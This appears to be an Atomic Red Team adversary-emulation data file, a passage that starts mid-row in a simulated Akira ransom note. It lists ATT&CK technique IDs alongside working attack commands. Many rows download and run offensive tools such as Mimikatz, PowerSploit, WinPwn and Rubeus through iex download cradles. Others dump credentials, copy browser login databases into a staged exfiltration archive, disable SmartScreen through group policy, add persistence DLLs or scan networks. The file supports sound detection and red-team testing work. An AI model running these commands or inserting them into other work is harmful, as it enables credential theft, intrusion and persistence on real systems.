negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""if you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:"" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""1. install tor browser to get access to our chat room - https://www.torproject.org/download/."" >> $env:userprofile\desktop\akira_readme.txt echo ""2. paste this link - https://akira.onion"" >> $env:userprofile\desktop\akira_readme.txt echo ""3. use this code - - to log into our chat."" >> $env:userprofile\desktop\akira_readme.txt echo """" >> $env:userprofile\desktop\akira_readme.txt echo ""keep in mind that the faster you will get in touch, the less damage we cause"" >> $env:userprofile\desktop\akira_readme.txt"
T1059,Mimikatz,"powershell.exe ""iex (new-object net.webclient).downloadstring('#{mimurl}'); invoke-mimikatz -dumpcreds"""
T1059,Run BloodHound from local disk,"import-module ""pathtoatomicsfolder\..\externalpayloads\sharphound.ps1"" try { invoke-bloodhound -outputdirectory $env:temp } catch { $_; exit $_.exception.hresult} start-sleep 5"
T1059,Run Bloodhound from Memory using Download Cradle,"write-host ""remote download of sharphound.ps1 into memory, followed by execution of the script"" -foregroundcolor cyan iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/bloodhoundad/bloodhound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/ingestors/sharphound.ps1'); invoke-bloodhound -outputdirectory $env:temp start-sleep 5"
T1059,Mimikatz - Cradlecraft PsSendKeys,"$url='https://raw.githubusercontent.com/powershellmafia/powersploit/f650520c4b1004daf8b3ec08007a0b945b91253a/exfiltration/invoke-mimikatz.ps1';$wshell=new-object -comobject wscript.shell;$reg='hkcu:\software\microsoft\notepad';$app='notepad';$props=(get-itemproperty $reg);[void][system.reflection.assembly]::loadwithpartialname('system.windows.forms');@(@('iwindowposy',([string]([system.windows.forms.screen]::allscreens)).split('}')[0].split('=')[5]),@('statusbar',0))|foreach{sp $reg (item variable:_).value[0] (variable _).value[1]};$curpid=$wshell.exec($app).processid;while(!($title=gps|?{(item variable:_).value.id-ieq$curpid}|foreach{(variable _).value.mainwindowtitle})){start-sleep -milliseconds 500};while(!$wshell.appactivate($title)){start-sleep -milliseconds 500};$wshell.sendkeys('^o');start-sleep -milliseconds 500;@($url,(' '*1000),'~')|foreach{$wshell.sendkeys((variable _).value)};$res=$null;while($res.length -lt 2){[windows.forms.clipboard]::clear();@('^a','^c')|foreach{$wshell.sendkeys((item variable:_).value)};start-sleep -milliseconds 500;$res=([windows.forms.clipboard]::gettext())};[windows.forms.clipboard]::clear();@('%f','x')|foreach{$wshell.sendkeys((variable _).value)};if(gps|?{(item variable:_).value.id-ieq$curpid}){@('{tab}','~')|foreach{$wshell.sendkeys((item variable:_).value)}};@('iwindowposdy','iwindowposdx','iwindowposy','iwindowposx','statusbar')|foreach{sp $reg (item variable:_).value $props.((variable _).value)};iex($res);invoke-mimikatz -dumpcr"
T1059,Invoke-AppPathBypass,"powershell.exe ""iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/enigma0x3/misc-powershell-stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/invoke-apppathbypass.ps1'); invoke-apppathbypass -payload 'c:\windows\system32\cmd.exe'"""
T1059,Powershell MsXml COM object - with prompt,"powershell.exe -exec bypass -noprofile ""$commsxml=new-object -comobject msxml2.serverxmlhttp;$commsxml.open('get','#{url}',$false);$commsxml.send();iex $commsxml.responsetext"""
T1059,Powershell XML requests,"""c:\windows\system32\windowspowershell\v1.0\powershell.exe"" -exec bypass -noprofile ""$xml = (new-object system.xml.xmldocument);$xml.load('#{url}');$xml.command.a.execute | iex"""
T1059,Powershell invoke mshta.exe download,"c:\windows\system32\cmd.exe /c ""mshta.exe javascript:a=getobject('script:#{url}').exec();close()"""
T1059,PowerShell Fileless Script Execution,"# encoded payload in next command is the following ""set-content -path ""$env:systemroot/temp/art-marker.txt"" -value ""hello from the atomic red team"""" reg.exe add ""hkey_current_user\software\classes\atomicredteam"" /v art /t reg_sz /d ""u2v0lunvbnrlbnqglxbhdgggiirlbny6u3lzdgvtum9vdc9uzw1wl2fydc1tyxjrzxiudhh0iiatdmfsdwugikhlbgxvigzyb20gdghlief0b21pyybszwqgvgvhbsi="" /f iex ([text.encoding]::ascii.getstring([convert]::frombase64string((gp 'hkcu:\software\classes\atomicredteam').art)))"
T1059,NTFS Alternate Data Stream Access,"add-content -path #{ads_file} -value 'write-host ""stream data executed""' -stream 'streamcommand' $streamcommand = get-content -path #{ads_file} -stream 'streamcommand' invoke-expression $streamcommand"
T1059,PowerShell Session Creation and Use,"new-pssession -computername #{hostname_to_connect} test-connection $env:computername set-content -path $env:temp\t1086_powershell_session_creation_and_use -value ""t1086 powershell session creation and use"" get-content -path $env:temp\t1086_powershell_session_creation_and_use remove-item -force $env:temp\t1086_powershell_session_creation_and_use"
T1059,ATHPowerShellCommandLineParameter -Command parameter variations,out-athpowershellcommandlineparameter -commandlineswitchtype #{command_line_switch_type} -commandparamvariation #{command_param_variation} -execute -erroraction stop
T1059,ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments,out-athpowershellcommandlineparameter -commandlineswitchtype #{command_line_switch_type} -commandparamvariation #{command_param_variation} -useencodedarguments -encodedargumentsparamvariation #{encoded_arguments_param_variation} -execute -erroraction stop
T1059,ATHPowerShellCommandLineParameter -EncodedCommand parameter variations,out-athpowershellcommandlineparameter -commandlineswitchtype #{command_line_switch_type} -encodedcommandparamvariation #{encoded_command_param_variation} -execute -erroraction stop
T1059,ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments,out-athpowershellcommandlineparameter -commandlineswitchtype #{command_line_switch_type} -encodedcommandparamvariation #{encoded_command_param_variation} -useencodedarguments -encodedargumentsparamvariation #{encoded_arguments_param_variation} -execute -erroraction stop
T1059,PowerShell Command Execution,powershell.exe -e #{obfuscated_code}
T1059,PowerShell Invoke Known Malicious Cmdlets,"$malcmdlets = #{malicious_cmdlets} foreach ($cmdlets in $malcmdlets) { ""function $cmdlets { write-host pretending to invoke $cmdlets }""} foreach ($cmdlets in $malcmdlets) { $cmdlets}"
T1059,PowerUp Invoke-AllChecks,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex(iwr https://raw.githubusercontent.com/powershellmafia/powersploit/d943001a7defb5e0d1657085a77a0e78609be58f/privesc/powerup.ps1 -usebasicparsing) invoke-allchecks
T1059,Abuse Nslookup with DNS Records,"# creating a custom nslookup function that will indeed call nslookup but forces the result to be ""whoami"" # this would not be part of a real attack but helpful for this simulation function nslookup { &""$env:windir\system32\nslookup.exe"" @args | out-null; @("""",""whoami"")} powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]"
T1059,SOAPHound - Dump BloodHound Data,#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}
T1059,SOAPHound - Build Cache,#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}
T1046,Port Scan,for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
T1046,Port Scan Nmap,sudo nmap -ss #{network_range} -p #{port} telnet #{host} #{port} nc -nv #{host} #{port}
T1046,Port Scan NMap for Windows,nmap #{host_to_scan}
T1046,Port Scan using python,"python ""#{filename}"" -i #{host_ip}"
T1046,WinPwn - spoolvulnscan,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') spoolvulnscan -noninteractive -consoleoutput
T1046,WinPwn - MS17-10,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') ms17-10 -noninteractive -consoleoutput
T1046,WinPwn - bluekeep,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') bluekeep -noninteractive -consoleoutput
T1046,WinPwn - fruit,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') fruit -noninteractive -consoleoutput
T1046,Network Service Discovery for Containers,docker build -t t1046 $pathtoatomicsfolder/t1046/src/ docker run --name t1046_container --rm -d -t t1046 docker exec t1046_container /scan.sh
T1046,Port-Scanning /24 Subnet with PowerShell,"$ipaddr = ""#{ip_address}"" if ($ipaddr -like ""*,*"") { $ip_list = $ipaddr -split "","" $ip_list = $ip_list.foreach({ $_.trim() }) write-host ""[i] ip address list: $ip_list"" $ports = #{port_list} foreach ($ip in $ip_list) { foreach ($port in $ports) { write-host ""[i] establishing connection to: $ip : $port"" try { $tcp = new-object net.sockets.tcpclient $tcp.connectasync($ip, $port).wait(#{timeout_ms}) | out-null } catch {} if ($tcp.connected) { $tcp.close() write-host ""port $port is open on $ip"" } } } } elseif ($ipaddr -notlike ""*,*"") { if ($ipaddr -eq """") { # assumes the ""primary"" interface is shown at the top $interface = get-netipinterface -addressfamily ipv4 -connectionstate connected | select-object -expandproperty interfacealias -first 1 write-host ""[i] using interface $interface"" $ipaddr = get-netipaddress -addressfamily ipv4 -interfacealias $interface | select-object -expandproperty ipaddress } write-host ""[i] base ip-address for subnet: $ipaddr"" $subnetsubstring = $ipaddr.substring(0, $ipaddr.lastindexof('.') + 1) # always assumes /24 subnet write-host ""[i] assuming /24 subnet. scanning $subnetsubstring'1' to $subnetsubstring'254'"" $ports = #{port_list} $subnetips = 1..254 | foreach-object { ""$subnetsubstring$_"" } foreach ($ip in $subnetips) { foreach ($port in $ports) { try { $tcp = new-object net.sockets.tcpclient $tcp.connectasync($ip, $port).wait(#{timeout_ms}) | out-null } catch {} if ($tcp.connected) { $tcp.close() write-host ""port $port is open on $ip"" } } } } else { write-host ""[error] invalid inputs"" exit 1 }"
T1046,Remote Desktop Services Discovery via PowerShell,"get-service -name ""remote desktop services"", ""remote desktop configuration"""
T1046,Port Scan using nmap (Port range),nmap -pn -sv -p #{port_range} #{host}
T1546,Create registry persistence via AppCert DLL,"copy-item ""#{dll_path}"" c:\users\public\atomictest.dll -force reg add ""hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls"" /v ""atomictest"" /t reg_expand_sz /d ""c:\users\public\atomictest.dll"" /f if(#{reboot}){restart-computer}"
T1558,Rubeus asreproast,"cmd.exe /c ""#{local_folder}\#{local_executable}"" asreproast /outfile:""#{local_folder}\#{out_file}"""
T1558,Get-DomainUser with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-domainuser -preauthnotrequired -properties distinguishedname -verbose
T1558,WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1') invoke-rubeus -command ""asreproast /format:hashcat /nowrap"""
T1484,LockBit Black - Modify Group policy settings -cmd,"reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimedc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffsetdc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtime /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffset /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v enablesmartscreen /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v shellsmartscreenlevel /t reg_sz /d block /f"
T1484,LockBit Black - Modify Group policy settings -Powershell,"new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtimedc -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtimeoffsetdc -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtime -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name grouppolicyrefreshtimeoffset -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name enablesmartscreen -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windows\system"" -name shellsmartscreenlevel -force"
T1018,Remote System Discovery - net,net view /domain net view
T1018,Remote System Discovery - net group Domain Computers,"net group ""domain computers"" /domain"
T1018,Remote System Discovery - nltest,nltest.exe /dclist:#{target_domain}
T1018,Remote System Discovery - ping sweep,"for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i"
T1018,Remote System Discovery - arp,arp -a
T1018,Remote System Discovery - arp nix,arp -a | grep -v '^?'
T1018,Remote System Discovery - sweep,"for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo ""#{subnet}.$ip up"" || : ; done"
T1018,Remote System Discovery - nslookup,"$localip = ((ipconfig | findstr [0-9].\.)[0]).split()[-1] $pieces = $localip.split(""."") $firstoctet = $pieces[0] $secondoctet = $pieces[1] $thirdoctet = $pieces[2] foreach ($ip in 1..255 | % { ""$firstoctet.$secondoctet.$thirdoctet.$_"" } ) {cmd.exe /c nslookup $ip}"
T1018,Remote System Discovery - adidnsdump,"""#{venv_path}\scripts\adidnsdump"" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}"
T1018,Adfind - Enumerate Active Directory Computer Objects,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=computer) #{optional_args}"
T1018,Adfind - Enumerate Active Directory Domain Controller Objects,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" #{optional_args} -sc dclist"
T1018,Remote System Discovery - ip neighbour,ip neighbour show
T1018,Remote System Discovery - ip route,ip route show
T1018,Remote System Discovery - netstat,netstat -r | grep default
T1018,Remote System Discovery - ip tcp_metrics,"ip tcp_metrics show |grep --invert-match ""^127\."""
T1018,Enumerate domain computers within Active Directory using DirectorySearcher,"$directorysearcher = new-object system.directoryservices.directorysearcher(""(objectcategory=computer)"") $directorysearcher.propertiestoload.add(""name"") $computers = $directorysearcher.findall() foreach ($computer in $computers) { $computer = $computer.properties.name if (!$computer) { continue } write-host $computer}"
T1018,Enumerate Active Directory Computers with Get-AdComputer,get-adcomputer -filter *
T1018,Enumerate Active Directory Computers with ADSISearcher,"([adsisearcher]""objectcategory=computer"").findall(); ([adsisearcher]""objectcategory=computer"").findone()"
T1018,Get-DomainController with PowerView,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1' -usebasicparsing); get-domaincontroller -verbose
T1018,Get-WmiObject to Enumerate Domain Controllers,try { get-wmiobject -class ds_computer -namespace root\directory\ldap -erroraction stop } catch { $_; exit $_.exception.hresult }
T1018,Remote System Discovery - net group Domain Controller,"net group /domain ""domain controllers"""
T1018,Enumerate Remote Hosts with Netscan,"cmd /c '#{netscan_path}' /hide /auto:""$env:temp\t1018netscanoutput.txt"" /range:'#{range_to_scan}'"
T1562,Safe Mode Boot,bcdedit /set safeboot network
T1555,Run Chrome-password Collector,"start-process ""#{file_path}\sysinternals\accesschk.exe"" -argumentlist ""-accepteula ."""
T1555,Search macOS Safari Cookies,"cd ~/library/cookies grep -q ""#{search_string}"" ""cookies.binarycookies"""
T1555,LaZagne - Credentials from Browser,"""#{lazagne_path}"" browsers"
T1555,Simulating access to Chrome Login Data,"copy-item ""$env:localappdata\google\chrome\user data\default\login data"" -destination ""pathtoatomicsfolder\..\externalpayloads"" copy-item ""$env:localappdata\google\chrome\user data\default\login data for account"" -destination ""pathtoatomicsfolder\..\externalpayloads"""
T1555,Simulating access to Opera Login Data,"copy-item ""$env:appdata\opera software\opera stable\login data"" -destination ""pathtoatomicsfolder\..\externalpayloads"""
T1555,Simulating access to Windows Firefox Login Data,"copy-item ""$env:appdata\mozilla\firefox\profiles\"" -destination ""pathtoatomicsfolder\..\externalpayloads"" -force -recurse"
T1555,Simulating access to Windows Edge Login Data,"copy-item ""$env:localappdata\microsoft\edge\user data\default"" -destination ""pathtoatomicsfolder\..\externalpayloads\edge"" -force -recurse"
T1555,Decrypt Mozilla Passwords with Firepwd.py,"$passworddblocation = get-childitem -path ""$env:appdata\mozilla\firefox\profiles\*.default-release\"" cmd /c #{venv_path}\scripts\python.exe #{firepwd_path} -d $passworddblocation > #{out_filepath} cat #{out_filepath}"
T1555,LaZagne.py - Dump Credentials from Firefox Browser,python3 #{lazagne_path}/lazagne.py #{specific_module} >> #{output_file}
T1555,Stage Popular Credential Files for Exfiltration,"$exfil_folder = ""$env:temp\t1555.003"" if (test-path ""$exfil_folder"") {} else {new-item -path ""$env:temp"" -name ""t1555.003"" -itemtype ""directory"" -force} $firefoxcredslocation = get-childitem -path ""$env:appdata\mozilla\firefox\profiles\*.default-release\"" if (test-path ""$firefoxcredslocation\key4.db"") {copy-item ""$firefoxcredslocation\key4.db"" -destination ""$exfil_folder\t1555.003firefox_key4.db""} else {} if (test-path ""$firefoxcredslocation\logins.json"") {copy-item ""$firefoxcredslocation\logins.json"" -destination ""$exfil_folder\t1555.003firefox_logins.json""} else {} if (test-path ""$env:localappdata\google\chrome\user data\default\login data"") {copy-item ""$env:localappdata\google\chrome\user data\default\login data"" -destination ""$exfil_folder\t1555.003chrome_login data""} else {} if (test-path ""$env:localappdata\google\chrome\user data\default\login data for account"") {copy-item ""$env:localappdata\google\chrome\user data\default\login data for account"" -destination ""$exfil_folder\t1555.003chrome_login data for account""} else {} if (test-path ""$env:appdata\opera software\opera stable\login data"") {copy-item ""$env:appdata\opera software\opera stable\login data"" -destination ""$exfil_folder\t1555.003opera_login data""} else {} if (test-path ""$env:localappdata/microsoft/edge/user data/default/login data"") {copy-item ""$env:localappdata/microsoft/edge/user data/default/login data"" -destination ""$exfil_folder\t1555.003edge_login data""} else {} compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" -force"
T1555,WinPwn - BrowserPwn,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') browserpwn -consoleoutput -noninteractive
T1555,WinPwn - Loot local Credentials - mimi-kittenz,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') kittenz -consoleoutput -noninteractive
T1555,WinPwn - PowerSharpPack - Sharpweb for Browser Credentials,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-sharpweb.ps1') invoke-sharpweb -command ""all"""
T1555,Simulating Access to Chrome Login Data - MacOS,"cp ~/library/""application support/google/chrome/default/login data"" ""/tmp/t1555.003_login data"" cp ~/library/""application support/google/chrome/default/login data for account"" ""/tmp/t1555.003_login data for account"""
T1555,WebBrowserPassView - Credentials from Browser,"start-process ""#{webbrowserpassview_path}"" start-sleep -second 4 stop-process -name ""webbrowserpassview"""
T1555,BrowserStealer (Chrome / Firefox / Microsoft Edge),"$profile = (gci -filter ""*default-release*"" -path $env:appdata\mozilla\firefox\profiles\).fullname copy-item $profile\key4.db -destination ""pathtoatomicsfolder\..\externalpayloads"" > $null copy-item $profile\logins.json -destination ""pathtoatomicsfolder\..\externalpayloads"" > $null remove-item $profile\key4.db > $null remove-item $profile\logins.json > $null copy-item ""$env:pathtoatomicsfolder\t1555.003\src\key4.db"" -destination $profile\ > $null copy-item ""$env:pathtoatomicsfolder\t1555.003\src\logins.json"" -destination $profile\ > $null cd ""$env:pathtoatomicsfolder\t1555.003\bin"" """"|.\browsercollector.exe"
T1555,Dump Chrome Login Data with esentutl,"esentutl.exe /y ""%localappdata%\google\chrome\user data\default\login data"" /d ""#{output_path}"""
T1137,Office Application Startup - Outlook as a C2,"reg add ""hkey_current_user\software\microsoft\office\16.0\outlook\security"" /v level /t reg_dword /d 1 /f mkdir %appdata%\microsoft\outlook\ >nul 2>&1 echo ""atomic red team test"" > %appdata%\microsoft\outlook\vbaproject.otm"
T1072,Radmin Viewer Utility,"""%programfiles(x86)%/#{radmin_exe}"""
T1072,PDQ Deploy RAT,"""%programfiles(x86)%/#{pdq_deploy_exe}"""
T1072,Deploy 7-Zip Using Chocolatey,# deploy 7-zip using chocolatey choco install -y 7zip
T1555,Extract Windows Credential Manager via VBA,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1555\src\t1555-macrocode.txt"" -officeproduct ""word"" -sub ""extract"""
T1555,Dump credentials from Windows Credential Manager With PowerShell [windows Credentials],iex (iwr 'https://raw.githubusercontent.com/triggerman-s/windows-credential-manager/4ad208e70c80dd2a9961db40793da291b1981e01/getcredmancreds.ps1' -usebasicparsing); get-passwordvaultcredentials -force
T1555,Dump credentials from Windows Credential Manager With PowerShell [web Credentials],iex (iwr 'https://raw.githubusercontent.com/triggerman-s/windows-credential-manager/4ad208e70c80dd2a9961db40793da291b1981e01/getcredmancreds.ps1' -usebasicparsing); get-credmancreds -force
T1555,Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials],"vaultcmd /listcreds:""windows credentials"" /all"
T1555,Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials],"vaultcmd /listcreds:""web credentials"" /all"
T1555,WinPwn - Loot local Credentials - lazagne,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') lazagnemodule -consoleoutput -noninteractive
T1555,WinPwn - Loot local Credentials - Wifi Credentials,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') wificreds -consoleoutput -noninteractive
T1555,WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') decryptteamviewer -consoleoutput -noninteractive
T1571,Testing usage of uncommonly used port with PowerShell,test-netconnection -computername #{domain} -port #{port}
T1571,Testing usage of uncommonly used port,echo quit | telnet #{domain} #{port} exit 0
T1619,AWS S3 Enumeration,"for bucket in ""$(aws s3 ls | cut -d "" "" -f3)""; do aws s3api list-objects-v2 --bucket $bucket --output text; done"
T1619,Azure - Enumerate Storage Account Objects via Shared Key authorization using Azure CLI,"az login # login to azure # get all storage accounts in the subscription $storageaccounts = az storage account list --query ""[].{name:name, resourcegroup:resourcegroup}"" --output json | convertfrom-json $storageaccountobjects = @() $downloadedfunctionfiles = @() foreach ($account in $storageaccounts) { write-output ""`nfound storage account $($account.name)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = """" queuename = """" } $allowsharedkeyaccess = az storage account show --name $account.name --resource-group $account.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { $connectionstring = az storage account show-connection-string --name $account.name --resource-group $account.resourcegroup --query connectionstring --output tsv $fileshares = az storage share list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($fileshare in $fileshares) { write-output ""found file share: $($fileshare)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = $fileshare containername = """" blobname = """" tablename = """" queuename = """" } } $containers = az storage container list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($container in $containers) { write-output ""found container: $($container)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = $container blobname = """" tablename = """" queuename = """" } $blobs = az storage blob list --connection-string $connectionstring --container-name $container --query ""[].name"" --output json | convertfrom-json foreach($blob in $blobs) { write-output ""found blob: $($blob)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = $container blobname = $blob tablename = """" queuename = """" } } } $tables = az storage table list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($table in $tables) { write-output ""found table: $($table)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = $table queuename = """" } } $queues = az storage queue list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($queue in $queues) { write-output ""found table: $($table)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = """" queuename = $queue } } } } # store file lists to csv file $storageaccountobjects | export-csv -path ""#{output_file}"" -notypeinformation write-output ""`ndownloaded storage account objects to #{output_file}"" # print lists that have been stored as csv file $storageaccountobjects | format-table -property resourcegroup, storageaccountname, filesharename, containername, blobname, tablename, queuename -autosize -wrap"
T1619,Azure - Scan for Anonymous Access to Azure Storage (Powershell),"try{$response = invoke-webrequest ""https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}"" -method ""get""} catch [system.net.webexception] {if($_.exception.response -ne $null) {$response = $_.exception.response.getresponsestream() $readresponse = new-object system.io.streamreader($response) $readresponse.basestream.position = 0 $responsebody = $readresponse.readtoend()} else {$responsebody = ""the storage account could not be anonymously accessed.""}} ""response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody"" | out-file -filepath #{output_file} -append"
T1619,Azure - Enumerate Azure Blobs with MicroBurst,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base #{base} -permutations ""#{wordlist}"" -outputfile ""#{output_file}"""
T1218,Regasm Uninstall Method Call Test,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /r:system.enterpriseservices.dll /out:""#{output_file}"" /target:library ""#{source_file}"" c:\windows\microsoft.net\framework\v4.0.30319\regasm.exe /u #{output_file}"
T1218,Regsvcs Uninstall Method Call Test,"$key = 'bwiaaaakaabsu0eyaaqaaaeaaqbhxtvkseh85e31z64cax+x2pwgc6dhp9vaod13cljtyau9sesuzkvljdhphy5ppg5clhigal7nzbp6quklh0lleq/vw979gwzvagszagvcfpuk6p1y69csr3stlzljjry76jijes4+rhbdwhp99y8qhwrlloc0qu/wxzaffhs2te/pkziituffcp46qxqolr8s3qzhajbnn9tgjkbix8mtget7hd1dc2hxv7dkac531zwqgxb54onuvfbd5p2t+vyvzuhnmay3px0bdxqwefozz+hiik1yudsnoe79zwnpvp1+bn0pk5qcpcs+6zujfrlqpj+nfhllicwej9ut7og3g/p+jpxgn0/+hitolufo7ucjh+wvzau//dzrgny5stqttmlxdhzbosndjpsqnzweufl5+o8ohujbhdm/zq0361mvssvwrmgdpkhggrx+7fbdgpbeq3m15/4zzg343v9nbwt1+qzu+tsvpu0wrvkwizrerjmddehjibowsx4v8aiwx8fppngemnz89tbaq8zbirjffmtynj1ffmknu3lgloefcacyyehpx/tqcbubig/cpcdhps/6sgcccix3tufneedmaqjmlku8x4zhcgjx6fpvk7qeeuvyv0ogkvnor9b/wkqhihjkzg+z6nwhmomyv5vmtz0jlm5azq6ypwmfzanmtl6kdzkv8l1yn2tkkjxeowulxnlibpelssjyuicplrctpggsxpgiht3rpz9tblzuefrfnlnihfvjni53yg4=' $content = [system.convert]::frombase64string($key) set-content $env:temp\key.snk -value $content -encoding byte c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /r:system.enterpriseservices.dll /out:""#{output_file}"" /target:library /keyfile:$env:temp\key.snk #{source_file} c:\windows\microsoft.net\framework\v4.0.30319\regsvcs.exe #{output_file}"
T1547,Create a new time provider,"net stop w32time copy-item ""$pathtoatomicsfolder\t1547.003\bin\atomictest.dll"" c:\users\public\atomictest.dll reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest"" /t reg_sz /v ""dllname"" /d ""c:\users\public\atomictest.dll"" /f reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest"" /t reg_dword /v ""enabled"" /d ""1"" /f reg add ""hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest"" /t reg_dword /v ""inputprovider"" /d ""1"" /f net start w32time"
